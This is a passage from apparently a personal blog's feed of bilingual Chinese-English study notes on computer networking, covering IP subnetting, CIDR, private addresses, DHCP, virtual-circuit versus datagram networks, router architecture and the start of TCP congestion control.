subnet</strong></p></li><li><p>例如：IP地址为192·168·100·5 ，子网掩码是255·255·255·0。算出网络地址、广播地址、地址范围、主机数</p><p>:one:将IP地址和子网掩码换算为<u>二进制</u>，子网掩码<u>连续全1</u>对应的IP地址部分是<strong>地址的网络部分</strong>(24位)，后面的是<strong>主机部分</strong>(8位)</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%822/4.15.jpg" class=""><p>:two:IP地址和子网掩码进行<u>与运算</u>，结果是<strong>网络地址</strong>（ 192.168.100.0）</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%822/4.16.jpg" class=""><p>:three:第三步：将上面的网络地址中的<u>网络部分不变</u>，<u>主机部分变为全1</u>，结果就是<strong>广播地址</strong>(192.168.100.255)</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%822/4.17.jpg" class=""><p>:four:网络地址**+1<strong>即为第一个主机地址，广播地址</strong>-1**即为最后一个主机地址，主机地址范围是： <strong>网络地址+1</strong> 至 <strong>广播 地址-1</strong>，即192·168·100·1 至 192·168·100·254</p><p>:five:主机的数量=2^主机位数^-2，即2^8^-2=254台，减2是因为主机不包括网络地址（网络地址既不能用于源地址，也不能用于目的地址，而是<strong>供路由器查找路由表用</strong>）和广播地址</p></li><li><p>例</p><p>Consider the network shown below, There are one router, 4 switches, and 11 hosts. Suppose all the switch table on all switches and all the ARP tables on all nodes are empty initially</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%822/4.18.jpg" class=""><p>a) Let’s assume that the IP address of R’s interface #1 is 202.115.32.1 and the IP address of R’s interface #2 is 202.115.32.65. Please assign IP address ranges to the subnets containing hosts A and B, and assign IP addresses in these ranges to hosts A and B. Your subnet addressings should use the smallest amount of address space</p><p>Solution：THE SUBNET CONTAINNING A 202.115.32.0/28 （共有7个设备需要9个地 址，3位主机位不够，需要4个主机位，可用IP主机地址范围为：202.115.32.1-15）</p><p>THE SUBNET CONTAINNING B 202.115.32.64/29（共有6个设备需要8个地 址，3位主机位够了，可用IP主机地址范围：202.115.32.65-70）</p></li></ul></li><li><p>IP addressing assignment (1):  CIDR</p><p>The Internet’s address assignment strategy is known as <strong>Classless Interdomain Routing(CDR，无类别域间路由选择）</strong></p><ul><li><p>address format: <strong>a.b.c.d/x</strong>, where x is # bits in subnet  portion of address, referred to as <strong>prefix (前缀)</strong></p></li><li><p>IP addresses of devices <u>within</u> the organization will  <u>share the common prefix</u>, <u>router only consider prefix  to forward</u></p></li><li><p>remaining 32-x bits of an address distinguishing among  the devices within the organization</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%822/4.19.jpg" class=""></li></ul></li><li><p>IP addressing assignment (2): classful addressing</p><p>classful addressing (分类编址): the network portions of an  IP address were constrained to be 8, 16, or 24 bits in  length</p><ul><li><p>subnets with 8-, 16-, and 24-bit subnet addresses  were known as class A, B, and C networks(A类网络、B 类网络、C类网络)</p></li><li><p>A class C (/24) subnet could accommodate only up to  2^8^ – 2 = 254 hosts, <strong>too small for many organizations</strong></p></li><li><p>a class B (/16) subnet, which supports up to 65,634  hosts, was <strong>too large</strong></p></li><li><p>led to a rapid depletion of the class B address space  and poor utilization of the assigned address space(<strong>快速消耗，利用率低</strong>)</p></li></ul></li><li><p>IP addressing assignment: private  IP address</p><ul><li>随着私有IP网络的发展，为节省可分配的注册IP地址，有一组IP地址被拿出来专门用于私有IP网络，称为私有IP地址。<ul><li>这些地址不会被Internet分配，<strong>在Internet上也不会被路由</strong>，虽然它们<strong>不能直接和Internet网连接</strong>，但通过技术手段仍旧可以和Internet通 信（<strong>NAT技术</strong>）</li><li>A类私有IP地址空间: 10.0.0.0~10.255.255.255 即10.0.0.0/8</li><li>B类私有IP地址空间:172.16.0.0~172.31.255.255即172.16.0.0/12</li><li>C类私有IP地址空间:192.168.0.0~192.168.255.255 即192.168.0.0/16</li></ul></li><li>一些特殊的IP地址<ul><li>0.0.0.0 ：保留地址，表示**“本网络”<strong>上的</strong>“本主机”**（<u>设备启动时但又不知道自己的IP地址情况下</u>）</li><li>255.255.255.255：<strong>受限广播地址</strong>，<strong>只在本网络上进行广播</strong>（各个路由器均不转发）。（IP地址的主机字段全为1，例如：192.168.10.255， 称为<strong>直接广播地址</strong>，被发送到该网络号的每台主机，路由器可转发）</li><li>127.0.0.1：<strong>环回地址(Loopback Address)</strong>，一般用来作为本地软件环回测试（lookback test）<strong>本主机的进程之间通信</strong></li></ul></li></ul></li><li><p><strong>Hierarchical addressing:  route aggregation (路由聚合)</strong></p><ul><li><p>hierarchical addressing allows efficient advertisement of routing  information, 使用单个网络前缀（200.23.16.0/20）通告多个网络（子网）的能力称为<strong>地址聚合或路由聚合</strong></p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%822/4.21.jpg" class=""></li><li><p>Hierarchical addressing:  more specific routes</p><ul><li><p>ISPs-R-Us has a more specific route to Organization 1</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%822/4.22.jpg" class=""></li></ul></li></ul></li><li><p>Q: How does a host get IP address?</p><p>(1) hard-coded by system admin in a file</p><p>Windows: control-panel-&gt;network-&gt;configuration-&gt;tcp/ip-&gt;properties</p><p>UNIX: /etc/rc.config</p></li><li><p>获得地址</p><ul><li><p>1、obtaining a Block of Addresses</p><ul><li><p>ISP也许自己已被 分配了地址块200.23.16.0/20。该IS 可以依次将该地址块分成8个长度相等的连续地址块，为本ISP支持的最多达8个组织中的一个分配这些地址块中的一块</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%822/4.20.jpg" class=""></li></ul></li><li><p>IP addresses are managed under the authority of the <strong>Internet Corporation for Assigned Names and Numbers (ICANN,因特网名字和编号分配机构)</strong></p><ul><li>it also to manage the <strong>DNS root servers</strong></li><li>also has the very contentious job of assigning domain names and resolving domain name disputes,分配域名与解决域名纷争</li></ul></li><li><p>2、Obtaining a Host Address: the Dynamic Host Configuration Protocol，获取主机地址∶动态主机配置协议</p><ul><li><strong>动态主机配置协议 （Dynamic Host Configuration，DHC）</strong></li><li>DHCP allows a host to learn additional information, such as its <strong>subnet mask</strong>(子网掩码), the address of its <strong>first-hop router</strong> (第一跳路由器，often called the <strong>default gateway</strong>，默认网关), and the address of its local DNS server</li><li>Because of DHCP’s ability to automate the network-related aspects of connecting a host into a network, it is often referred to as a <strong>plug-and-play protocol(即插即用协议)</strong></li></ul></li></ul></li><li><p>DHCP is a <strong>client-server protocol</strong></p><ul><li>In the simplest case, <u>each</u> subnet will have a DHCP server</li><li>if no server is present on the subnet, a DHCP relay <strong>agent</strong> (typically a router) that knows the address of a DHCP server for that network is needed</li></ul></li><li><p>DHCP goal: allow host to dynamically obtain its IP address  from network server when it joins network</p><ul><li>can renew its lease on address in use</li><li>allows reuse of addresses (only hold address while  connected/“ on ”)</li><li>support for mobile users who want to join network  (more shortly)</li></ul></li><li><p>DHCP client-server  scenario</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%822/4.23.jpg" class=""><p>:one:DHCP server discovery</p><ul><li>host <strong>broadcasts</strong> <strong>“DHCP discover” msg</strong> [optional], dest. IP address of 255.255.255.255, dest. port  67, “this host” source IP address of 0.0.0.0</li><li>The DHCP client passes the IP datagram to the link layer, which then broadcasts this frame to all nodes attached to the subnet</li></ul><p>:two:DHCP server offer(s)</p><ul><li>DHCP servers responds with <strong>“DHCP offer” msg [optional]</strong>, destination IP address of 255.255.255.255,  dest. port 68, including <strong>transaction ID</strong>, <strong>proposed IP  address (建议IP地址)</strong>, <strong>network mask(子网掩码)</strong>, <strong>IP address  lease time</strong> (<strong>租赁时间</strong>, typically several hours or days)</li></ul><p>:three:DHCPrequest</p><ul><li>host <u>choose one</u> offer and requests IP address:  <strong>“DHCP request” msg</strong>, and choing back the configuration parameters,回显配置参数</li></ul><p>:four:: DHCP server sends address: <strong>“DHCP ack” msg</strong> Client use DHCP-allocated IP address for the lease  duration! confirming the requested parameters，证实所要求的参数</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%822/4.24.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%822/4.25.jpg" class=""><p>总结:</p><p>(1) 整个过程中，DHCP客户端的源IP地址均为0.0.0.0</p><p>(2) 整个过程中，DHCP客户端和服务端的目标IP地址均为 255.255.255.255</p><p>(3) yiaddr除第一次DHCP客户端请求时为空，后面三个阶段的地 址为服务器分配和客户端希望使用的IP地址</p><p>(4) 客户端一般使用UDP 68号端口，服务端一般使用UDP 67号端口</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第四章-网络层（一）</title>
    <link href="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%821/"/>
    <url>/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%821/</url>
    
    <content type="html"><![CDATA[<ul><li><p><strong>forwarding</strong></p><ul><li>Forwarding involves the transfer of a packet from an incoming link to an outgoing link within a <strong>single</strong> router</li></ul></li><li><p><strong>routing</strong></p><ul><li>Routing involves <strong>all of a network’s routers</strong>, whose collective(集体的) interactions(相互作用，交流) via <u>routing protocols</u> <strong>determine the paths</strong> that packets take on their trips from <u>source to destination</u> node</li></ul></li></ul><h1>4.1 Introduction</h1><ul><li>routers are shown with a truncated(截断的) protocol stack, that is, with no upper layers above the network layer, because(<u>except for control purposes</u>) routers do not run application-and transport-layer protocols</li></ul><h3 id="4-1-1-Forwarding-and-Routing">4.1.1 Forwarding and Routing</h3><h6 id="Forwarding">Forwarding</h6><ul><li>:small_blue_diamond:When a packet arrives at a router’s input link, the router must move the packet to the <strong>appropriate output link</strong></li><li>refers to the <strong>router-local action</strong>(路由器本地动作) of transferring a packet from an input link interface to the appropriate output link interface</li></ul><h6 id="Routing">Routing</h6><ul><li><p>:small_blue_diamond:The network layer must determine the route or path taken by packets as they flow from a sender to a receiver</p></li><li><p>The algorithms that calculate these paths are referred to as <strong>routing algorithms</strong>(路由选择算法)</p></li><li><p>refers to the <strong>network-wide process</strong>(网络范围的过程) that determines the end-to-end paths that packets take from source to destination</p></li><li><p><u>Every</u> router has a <strong>forwarding table</strong>(转发表)</p></li><li><p>A router forwards a packet by examining the value of a field in the arriving packet’s <strong>header</strong>, and then using this value to index(索引) into the router’s forwarding table</p></li><li><p><u>Depending on the network-layer protocol,</u> this value in the packet’s header could be the <u>destination address</u> of the packet or <u>an indication of the connection</u> to which the packet belongs，该分组所属连接的指示</p></li><li><p>the <strong>routing algorithm</strong> <u>determines the values</u> that are inserted into the <strong>routers’forwarding tables</strong></p></li><li><p>The routing algorithm may be centralized(集中式的) or decentralized(分布式的)，In either case, a <u>router</u> <strong>receives routing protocol messages</strong>, which are used to <strong>configure(配置) its forwarding table</strong></p></li><li><p>packet switches</p><ul><li>link-laver switches：base their forwarding decision on the value in the link-laver field</li><li>routers：base their forwarding decision on the value in the network-layer field，，基于网络层字段中的值做转发决定</li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%821/4.2.jpg" class=""></li></ul><h6 id="Connection-Setup，建立连接">Connection Setup，建立连接</h6><ul><li><p>ATM, frame relay, X.25, MPLS (not Internet)</p></li><li><p>some network-layer architectures—for example, <strong>ATM</strong> and <strong>frame-relay</strong>, but <strong>not the Internet</strong>— require the routers along the chosen path from source to destination to <strong>handshake</strong> with each other in order to set up state before network-layer data packets within a given source-to-destination connection can begin to flow</p></li><li><p>before datagrams flow, two end hosts and intervening (中间的) routers establish virtual</p><ul><li>connection routers get involved (路由器也参与了！)</li></ul></li><li><p>network vs transport layer connection service:</p><ul><li>network: between two hosts (may also involve intervening  routers in case of VCs)</li><li>transport: between two processes</li></ul></li></ul><h3 id="4-1-2-Network-Service-Models">4.1.2 Network Service Models</h3><ul><li><p>The <strong>network service model</strong>(网络服务模型) defines the <strong>characteristics</strong> of end-to-end transport of packets between sending and receiving end systems，端到端运输特性</p></li><li><p>能由网络层提供的特定服务：</p><ul><li><p>Example services for  individual datagrams:</p><ul><li>Guaranteed delivery<ul><li>packet will eventually arrive at its destination</li></ul></li><li>Guaranteed delivery with bounded delay，具有时延上界的确保交付<ul><li><u>not only</u> guarantees delivery of the packet, <u>but</u> delivery <strong>within a specified host-to-host delay bound</strong></li><li>less than 40 msec delay</li></ul></li></ul></li><li><p>Example services for <strong>a flow of datagrams</strong>(分组流)</p><ul><li><p>In-order packet delivery</p></li><li><p>Guaranteed maximum jitter，确保最大时延抖动</p><ul><li>guarantees that the amount of time between the <u>transmission of two successive(连续的，接连的) packets at the sender</u> is equal to the amount of time between their <u>receipt at the destination</u> (or that this spacing changes by no more than some specified value)</li></ul></li><li><p>Security services</p><ul><li>Using a secret session key known only by a source and destination host</li><li>the network layer in the source host could encrypt the payloads of all datagrams being sent to the destination host；responsible for decrypting the payloads</li><li><strong>confidentiality</strong>(机密性) would be provided to <strong>all</strong> transport-layer segments (TCP and UDP) between the source and destination hosts</li><li>could provide <strong>data integrity</strong>(数据完整性) and <strong>source authentication</strong>(源鉴别) services</li></ul></li><li><p>Guaranteed minimal bandwidth，确保最小带宽</p><ul><li>As long as the sending host transmits bits(as part of packets) at a rate below the specified bit rate, then no packet is lost and each packet arrives within a prespecified host-to-host delay (for example, within 40 msec)</li></ul></li></ul></li></ul></li><li><p>The <strong>Internet</strong>’s <strong>network layer</strong> provides <strong>a single service</strong>, known as <strong>best-effort service</strong>(尽力而为服务)</p></li></ul><table><thead><tr><th>Network Architecture</th><th>Service Model</th><th>Bandwidth</th><th>Loss</th><th>Order</th><th>Timing</th><th>Congestion feedback</th></tr></thead><tbody><tr><td>Internet</td><td>best effort</td><td>none</td><td>no</td><td>no</td><td>no</td><td>no (inferred via loss)</td></tr><tr><td>ATM</td><td>CBR</td><td>constant rate</td><td>yes</td><td>yes</td><td>yes</td><td>no congestion</td></tr><tr><td>ATM</td><td>VBR</td><td>constant rate</td><td>yes</td><td>yes</td><td>yes</td><td>no congestion</td></tr><tr><td>ATM</td><td>ABR</td><td>constant rate</td><td>no</td><td>yes</td><td>no</td><td>yes</td></tr><tr><td>ATM</td><td>UB</td><td>none</td><td>no</td><td>yes</td><td>no</td><td>no</td></tr></tbody></table><p>两个最重要的 ATM 服务模型是恒定比特率和可用比特率服务：</p><ul><li><p>**Constant bit rate(CBR，恒定比特率)**ATM network service</p><ul><li>to provide a <u>flow of packets</u>分组流(known as cells信元 in ATM terminology)with a <strong>virtual pipe</strong> whose properties(属性，性质) are the same <u>as if</u> a dedicated fixed-bandwidth transmission link existed between sending and receiving hosts</li><li>With CBR service, a flow of ATM cells is carried across the network in such a way that a cell’s end-to-end delay, the <u>variability</u>(可变性，即时延抖动) in a cell’s end-end delay(that is, the jitter),and the fraction(分数) of cells that are <u>lost or delivered late</u>(丢失或推迟交付的信元的比率) are all guaranteed to be less than specified values</li></ul></li><li><p><strong>Available bit rate(ABR，可用比特率)</strong> ATM network service</p><ul><li>cells may be <u>lost</u> under ABR service</li><li>unlike in the Internet, however, cells <u>cannot be reordered</u></li><li>a **minimum cell transmission rate (MCR，最小信元传输速率)**is guaranteed to a connection using ABR service</li><li>ATM ABR service can provide <u>feedback</u> to the sender</li></ul></li></ul><h1>4.2 Virtual Circuit and Datagram Networks，虚电路和数据报网络</h1><p>网络层和运输层的差异</p><ul><li><p>:small_blue_diamond:network layer：host-to-host services</p><p>:small_red_triangle:transport layer： process-to-process services</p></li><li><p>:small_blue_diamond:network layer：host-to-host services</p><ul><li>either a host-to-host connectionless service or a host-to-host connection service, <strong>but not both</strong></li><li>Computer networks that provide only a <strong>connection service</strong> at the network layer are called <strong>virtual-circuit (VC)networks</strong>(虚电路网络)</li><li>Computer networks that provide only a <strong>connectionless service</strong> at the network layer are called <strong>datagram networks</strong>(数据报网络)</li></ul></li><li><p>:small_blue_diamond:network layer： implemented in the <strong>routers</strong> in the network core as well as in the <strong>end systems</strong></p><p>:small_red_triangle:transport layer： implemented at the edge of the network in the <strong>end systems</strong></p></li></ul><h3 id="4-2-1-Virtual-Circuit-Networks">4.2.1 Virtual-Circuit Networks</h3><ul><li><p>the <strong>Internet</strong> is a <strong>datagram network</strong></p></li><li><p>many alternative network architectures—including those of <strong>ATM</strong> and <strong>frame relay(帧中继)</strong>—are virtual-circuit networks and use connections at the network layer</p><ul><li>These <u>network-layer connections</u> are called <strong>virtual circuits (VCs，虚电路）</strong></li></ul></li><li><p>虚电路的组成</p><ul><li>a <strong>path</strong> (<u>a series of links and routers</u>) between the source and destination hosts</li><li><strong>VC numbers</strong><ul><li>one number for each link along the path</li></ul></li><li>entries(条目，记录) in the forwarding table in each router along the path，沿着该路径的每台路由器中的转发表表项<ul><li><u>a virtual circuit</u> may have a <u>different VC number</u> on each link</li><li>each intervening(中间的) router must <strong>replace the VC number</strong> of each traversing packet with a new VC number</li><li>The new VC number is obtained from the <strong>forwarding table</strong></li></ul></li></ul><table><thead><tr><th>Incoming interface</th><th>Incoming VC #</th><th>Outgoing interface</th><th>Outgoing VC #</th></tr></thead><tbody><tr><td>1</td><td>12</td><td>3</td><td>22</td></tr><tr><td>2</td><td>63</td><td>1</td><td>18</td></tr></tbody></table></li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%821/4.3.jpg" class=""><ul><li><p>不简单地保持相同的VC号的原因</p><ul><li>replacing the number from link to link reduces the length of the VC field in the packet heade，长度</li><li>VC setup is considerably simplified by permitting(分配) a different VC number at each link along the path of the VC，简化建立<ul><li>each link in the path can choose a VC number independently of the VC numbers chosen at other links along the path</li><li>若相同：the routers would have to exchange and process a substantial(固定的) number of messages to agree on a common VC number(e.g., one that is not being used by any other existing VC at these routers) to be used for a connection</li></ul></li></ul></li><li><p>Routers maintain <strong>connection state information</strong>(连接状态信息)!</p><ul><li>each time a new connection is established across a router, a new connection entry must be added to the router’s for warding table</li><li>each time a connection is released, an entry must be removed from the table</li><li>even if <u>there is no VC-number translation</u>, it is still necessary to maintain connection <strong>state information</strong> that associates VC numbers with <strong>output interface numbers</strong></li></ul></li><li><p>there are three identifiable phases in a virtual circuit:</p><ul><li><p>VC setup</p><p>:one:the sending transport layer <u>contacts</u>(联系) the network layer, <u>specifies</u>(指定) the <u>receiver’s address</u>, and <u>waits</u> for the network to set up the VC</p><p>:two:The <u>network layer</u>  <strong>determines the path</strong> between sender and receiver(the series of <strong>links and routers</strong> through which <strong>all</strong> packets of the VC will travel)</p><p>:three:The <u>network layer</u> <strong>determines the VC number</strong> for <u>each link</u> along the path</p><p>:four:<u>the network layer</u> <strong>adds an entry</strong> <u>in the forwarding table</u> in <u>each</u> router</p><ul><li>During VC setup, the network layer may also <strong>reserve resources</strong> (for example, bandwidth) along the path of the VC</li></ul></li><li><p>Data transfer，数据传输</p><p>once the VC has been established, packets can begin to flow along the VC</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%821/4.17.jpg" class=""></li><li><p>VC teardown，虚电路拆除</p><p>:one:it is initiated when the <u>sender (or receiver)</u> informs the network layer</p><p>:two:<u>The network layer</u> will then typically <u>inform</u> the end system <u>on the other side</u> of the network of the call termination</p><p>:three:<u>The network layer</u> <strong>update</strong> the <u>forwarding tables</u> in <u>each</u> of the packet routers on the path to indicate that <u>the VC no longer exists</u></p></li></ul></li><li><p>There is a subtle(细微) but important distinction between <u>VC setup at the network layer</u> and <u>connection setup at the transport layer</u></p><ul><li>connection setup at the <u>transport</u> layer involves <strong>only the two end systems</strong><ul><li>During transport-layer connection setup, the two end systems <strong>alone</strong>(单独地，独立地) <strong>determine the parameters</strong> of their transport-layer connection<ul><li>for example, initial <u>sequence number</u> and <u>flow-control window size</u></li></ul></li><li>the <strong>routers</strong> within the network are completely <strong>oblivious</strong>(未察觉的，不知道) to the transport-layer connection</li></ul></li><li>with a VC network layer, routers along the path between the two end systems are involved in VC setup, and <u>each router</u> <strong>is fully aware of</strong> <u>all</u> the VCs passing through it</li></ul></li><li><p><strong>signaling messages</strong>(信令报文)：the messages that the end systems send into the network to <u>initiate or terminate a VC</u>, and the messages passed <u>between the routers to set up the VC</u> (that is, to modify connection state in router tables)</p><p><strong>signaling protocols</strong>(信令协议)：the protocols used to <u>exchange these messages</u></p><ul><li>used to setup, maintain, teardown VC</li><li>used in ATM, frame-relay, X.25</li><li>not used in today’s Internet</li></ul></li></ul><h3 id="4-2-2-Datagram-Networks，数据报网络">4.2.2 Datagram Networks，数据报网络</h3><ul><li><p>In a datagram network,each time an end system wants to send a packet,it <u>stamps</u>(印记，标记) the packet with <strong>the address of the destination end system</strong> and then pops the packet into the network</p><ul><li><strong>no call setup</strong> at network layer（without any VC setup）</li><li>routers: <strong>no state</strong> about end-to-end connections<ul><li>no network-level concept of “connection”</li></ul></li><li>packets forwarded in routers using destination host  address (目标主机地址)<ul><li>packets between same source-dest pair may take  different paths!!!</li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%821/4.18.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%821/4.19.jpg" class=""></li><li><p>the router uses <strong>the longest prefix matching rule(最长前缀匹配原则)</strong></p><ul><li>finds the longest matching entry in the table and forwards the packet to the link interface associated with the longest prefix match</li></ul></li><li><p>Although routers in datagram networks maintain no connection state information, they nevertheless <strong>maintain forwarding state information</strong>(维持转发状态信息) in their <u>forwarding tables</u></p><ul><li>the time scale at which this forwarding state information changes is relatively(相对) <strong>slow</strong></li><li>in a <strong>datagram network</strong> the <u>forwarding tables</u> are <strong>modified</strong> by <u>the routing algorithms</u>, which <u>typically</u> <strong>update</strong> a forwarding table <u>every one-to-five minutes</u> or so</li><li>in a <strong>VC network</strong>, a forwarding table in a router is modified whenever a new connection is <strong>set up</strong> through the router or whenever an existing connection through the router is <strong>tor down</strong></li></ul></li><li><p>a series of packets sent from one end system to another may follow <strong>different paths</strong> through the network and may arrive <strong>out of order</strong></p><ul><li>Because forwarding tables in datagram networks <u>can be modified at any time</u></li></ul></li></ul><h3 id="4-2-3-Origins-of-VC-and-Datagram-Networks">4.2.3 Origins of VC and Datagram Networks</h3><table><thead><tr><th>Internet (datagram)</th><th>ATM (VC)</th></tr></thead><tbody><tr><td>data exchange among computers：<br />“elastic” service, no strict  timing req</td><td>evolved from telephony ( 电话网络演化而来)</td></tr><tr><td>many link types (fiber, radio,  Ethernet, statellite)：<br />different characteristics<br />uniform service difficult</td><td>human conversation:<br />strict timing, reliability requirements<br />need for guaranteed  service</td></tr><tr><td>“smart” end systems  (computers)：<br />can adapt, perform control,  error recovery<br />simple inside network,  complexity at “edge”(边缘复杂 ，核心简单)</td><td>“dumb” end systems：<br />telephones<br />complexity inside  network (边缘简单，核心复杂)</td></tr></tbody></table><h1>4.3 What’s Inside a Router?路由器工作原理</h1><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%821/4.20.jpg" class=""><ul><li>Four components of a router can be identified:<ul><li>Input ports<ul><li>it performs the physical-layer functions of terminating an incoming physical link to a router，执行将一条输入的物理链路与路由器相连接的物理层功能</li><li>It performs the data link-layer functions needed to interoperate(交互) with the data link-layer functions at the remote side of the incoming link</li><li>It also performs a lookup and forwarding function o that a packet forwarded into the switching fabric(结构) of the router emerges at the appropriate output port</li><li>multiple ports are often gathered together on a single <strong>line card(接口卡)</strong> within a router</li></ul></li><li>switching fabric，交换结构<ul><li>The switching fabric connects the router’s <u>input ports</u> to its <u>output ports</u>.</li><li>This switching fabric is completely contained within the router—a network inside of a network router!</li></ul></li><li>Output ports<ul><li>An output port stores the packets that have been forwarded to it through the switching fabric and then transmits the packets on the outgoing link</li><li>The output port thus performs the reverse data link-and physical-layer functionality of the input port</li><li>When a link is bidirectional, an output port to the link will typically be <u>paired</u> with the input port for that link, on the <u>same</u> line card</li></ul></li><li>Ruting processor，路由选择处理器<ul><li>maintains the routing information forwarding tables</li><li>performs network management functions  within the router</li></ul></li></ul></li></ul><h3 id="4-3-1-Input-Ports">4.3.1 Input Ports</h3><ul><li><p>The <strong>lookup/forwarding module</strong> in the <strong>input port</strong> is central to the forwarding function of the router</p></li><li><p>here the router <strong>determines the output port</strong> to which an arriving packet will be forwarded via the switching fabric</p></li><li><p><strong>a shadow copy of the forwarding table</strong> is typically stored at <u>each input port</u> and <strong>updated</strong>, as needed, by the **routing processor **==》 Such <strong>decentralized(去中心化)</strong> forwarding avoids creating a forwarding processing <u>bottleneck</u>(瓶颈) at a single point within the router</p></li><li><p>Once the output port for a packet <u>has been determined</u> via the lookup, the packet can be <strong>forwarded into the switching fabric</strong></p></li></ul><h3 id="4-3-2-Switching-Fabric，交换结构">4.3.2 Switching Fabric，交换结构</h3><ul><li><p>It is through the switching fabric that the packets are actually switched from an input port to an output port</p></li><li><p>switching rate: rate at which packets can be transfer  from inputs to outputs</p><ul><li>often measured as multiple of input/output line rate</li><li>N inputs: switching rate N times line rate desirable</li></ul></li><li><p>three types of switching fabrics</p><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%821/4.8.jpg" class=""><ul><li><p>Switching via memory，经内存交换</p><ul><li>traditional computers with switching under direct  control of CPU</li><li>packet copied to system’s memory</li><li>speed limited by memory bandwidth (2 bus  crossings per datagram)</li></ul><img src="/2024/02/20/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E7%BD%91%E7%BB%9C%E5%B1%821/4.21.jpg" class=""></li><li><p>Switching via a bus</p><ul><li>datagram from input port memory to output port memory via a shared  bus</li><li>bus contention: switching speed  limited by bus bandwidth</li><li>32 Gbps bus, Cisco 5600: sufficient  speed for access and enterprise  routers</li></ul></li><li><p>Switching via  interconnection network</p><ul><li>overcome bus bandwidth limitations  banyan networks, crossbar, other  interconnection nets initially developed  to connect processors in multiprocessor</li><li>advanced design: fragmenting datagram  into fixed length cells, switch cells  through the fabric</li><li>Cisco 12000: switches 60 Gbps through  the interconnection network</li></ul></li></ul></li></ul><h3 id="4-3-3-Output-Ports">4.3.3 Output Ports</h3><ul><li>Output port processing takes the packets that have been stored in the output port’s memory and transmits them over the outgoing link</li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第三章-运输层（七）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%827/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%827/</url>
    
    <content type="html"><![CDATA[<h1>3.7 TCP Congestion Control，TCP拥塞控制</h1><ul><li><p>the approach taken by TCP is to have each sender limit the rate at which it sends traffic into its connection as a function of perceived(感知到的，认为) network congestion，让每一个发送方根据所感知到的网络拥塞程度来限制其能向连接发送流量的速率</p><ul><li>increases its send rate, perceives little congestion</li><li>reduces its send rate, perceives congestion</li></ul></li><li><p>each side of a TCP connection consists of a receive buffer, a send buffer, and several variables (LastByteRead, rwnd, and so on)</p></li><li><p>The TCP congestion-control mechanism operating at the <strong>sender</strong> keeps track of an <u>additional variable</u>, the <strong>congestion window</strong>(拥塞窗口)，denoted <strong>cwnd</strong></p><ul><li><p>imposes a constraint(限制) on the <u>rate</u> at which a TCP <u>sender</u> can send traffic(流量，数据量) into the network</p></li><li><p>the amount of <strong>unacknowledged data</strong> at a sender may not exceed <u>the minimum of cwnd and rwnd</u>, that is: <strong>LastByteSent - LastByteAcked ≤ min{cwnd,rwnd}</strong></p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%827/1.jpg" class=""></li><li><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>r</mi><mi>a</mi><mi>t</mi><mi>e</mi><mo>≈</mo><mfrac><mrow><mi>c</mi><mi>w</mi><mi>n</mi><mi>d</mi></mrow><mrow><mi>R</mi><mi>T</mi><mi>T</mi></mrow></mfrac><mi>b</mi><mi>y</mi><mi>t</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">/</mi><mi>s</mi><mi>e</mi><mi>c</mi></mrow><annotation encoding="application/x-tex">rate ≈\frac{cwnd}{RTT} bytes/sec</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span 